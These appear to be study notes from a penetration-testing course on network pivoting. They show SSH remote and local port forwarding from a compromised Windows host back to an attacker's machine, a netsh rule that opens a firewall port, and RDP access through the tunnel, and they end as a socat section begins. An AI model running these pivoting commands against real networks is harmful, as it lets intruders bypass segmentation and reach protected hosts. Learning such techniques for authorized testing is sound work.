Most of the lateral movement techniques we have presented require specific ports to be available for an attacker. In real-world networks, the administrators may have blocked some of these ports for security reasons or have implemented segmentation around the network, preventing you from reaching *SMB, RDP, WinRM or RPC ports*.

To go around these restrictions, we can use port forwarding techniques, which consist of *using any compromised host as a jump box to pivot to other hosts*. It is expected that some machines will have more network permissions than others, as every role in a business will have different needs in terms of what network services are required for day-to-day work.

## SSH Tunnelling
https://www.youtube.com/watch?v=N8f5zv9UUMI

The first protocol we'll be looking at is SSH, as it already has built-in functionality to do port forwarding through a feature called **SSH Tunneling**. While SSH used to be a protocol associated with Linux systems, Windows now ships with the OpenSSH client by default, so you can expect to find it in many systems nowadays, independent of their operating system.

SSH Tunnelling can be used in different ways to forward ports through an SSH connection, which we'll use depending on the situation. To explain each case, let's assume a scenario where we've gained control over the PC-1 machine (it doesn't need to be administrator access) and would like to use it as a pivot to access a port on another machine to which we can't directly connect. *We will start a tunnel from the PC-1 machine, acting as an SSH client, to the Attacker's PC, which will act as an SSH server*. The reason to do so is that you'll often find an SSH client on Windows machines, but no SSH server will be available most of the time.
	![](Pasted%20image%2020241118194131.png)
Since we'll be making a connection back to our attacker's machine, we'll want to create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels:
```shell-session
useradd {tunneluser} -m -d {/home/tunneluser} -s /bin/true
passwd {tunneluser}
```

Depending on your needs, the SSH tunnel can be used to do either local or remote port forwarding. Let's take a look at each case:

### SSH Remote Port Forwarding
Let's assume that firewall policies *block the attacker's machine from directly accessing port 3389* on the server. If the attacker has previously compromised PC-1 and, in turn, *PC-1 has access to port 3389* of the server, it can be used to pivot to port 3389 using remote port forwarding from PC-1. 

**Remote port forwarding** allows you to take a reachable port from the SSH client (in this case, PC-1) and project it into a **remote** SSH server (the attacker's machine).
	![](Pasted%20image%2020241118194648.png)
A valid question that might pop up by this point is why we need port forwarding if we have compromised PC-1 and can run an RDP session directly from there. The answer is simple: in a situation where we only have console access to PC-1, we won't be able to use any RDP client as we don't have a GUI. By making the port available to your attacker's machine, you can use a Linux RDP client to connect. Similar situations arise when you want to run an exploit against a port that can't be reached directly, as your exploit may require a specific scripting language that may not always be available at machines you compromise along the way.

Referring to the previous image, to forward port 3389 on the server back to our attacker's machine, we can use the following command on PC-1:

```shell-session
C:\> ssh {tunneluser}@{1.1.1.1} -R {3389}:{3.3.3.3}:{3389} -N
```

This will establish an SSH session from PC-1 to `1.1.1.1` (Attacker PC) using the `tunneluser` user.
- Since the `tunneluser` isn't allowed to run a shell on the Attacker PC, we need to run the `ssh` command with the `-N` switch to prevent the client from requesting one, or the connection will exit immediately
- The `-R` switch is used to request a remote port forward, and the syntax requires us first to indicate the *port we will be opening at the SSH server* (3389), followed by a colon and then the *IP and port of the socket we'll be forwarding* (3.3.3.3:3389). 

Note:
    The port numbers don't need to match, although they do in this example.

The command itself won't output anything, but the tunnel will depend on the command to be running. Whenever we want, we can close the tunnel by pressing CTRL+C as with any other command.

Once our tunnel is set and running, we can go to the attacker's machine and RDP into the forwarded port to reach the server:

```shell-session
munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:{MyUser} /p:{MyPassword}
```

### SSH Local Port Forwarding
**Local port forwarding** allows us to "pull" a port from an SSH server into the SSH client. In our scenario, this could be used to take any service available in our attacker's machine and make it available through a port on PC-1. That way, any host that can't connect directly to the attacker's PC but can connect to PC-1 will now be able to reach the attacker's services through the pivot host.

Using this type of port forwarding would allow us to run reverse shells from hosts that normally wouldn't be able to connect back to us or simply make any service we want available to machines that have no direct connection to us.
	![](Pasted%20image%2020241118195945.png)

To forward port 80 from the attacker's machine and make it available from PC-1, we can run the following command on PC-1:

```shell-session
C:\> ssh {tunneluser}@{1.1.1.1} -L *:{80}:{127.0.0.1}:80 -N
```

The command structure is similar to the one used in remote port forwarding but uses the `-L` option for local port forwarding. This option requires us to indicate the local socket used by PC-1 to receive connections (`*:80`) and the remote socket to connect to from the attacker's PC perspective (`127.0.0.1:80`).

Notice that we use the IP address 127.0.0.1 in the second socket, as from the attacker's PC perspective, that's the host that holds the port 80 to be forwarded.

Since we are opening a new port on PC-1, we might need to add a firewall rule to allow for incoming connections (with `dir=in`). *Administrative privileges are needed for this:*

```shell-session
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

Once your tunnel is set up, any user pointing their browsers to PC-1 at `http://2.2.2.2:80` and see the website published by the attacker's machine.


# Port Forwarding With socat
In situations where SSH is not available, socat can be used to perform similar functionality. While not as flexible as SSH, socat allows you to forward ports in a much simpler way. One of the disadvantages of using socat is that we need to transfer it to the pivot host (PC-1 in our current example), making it more detectable than SSH, but it might be worth a try where no other option is available.

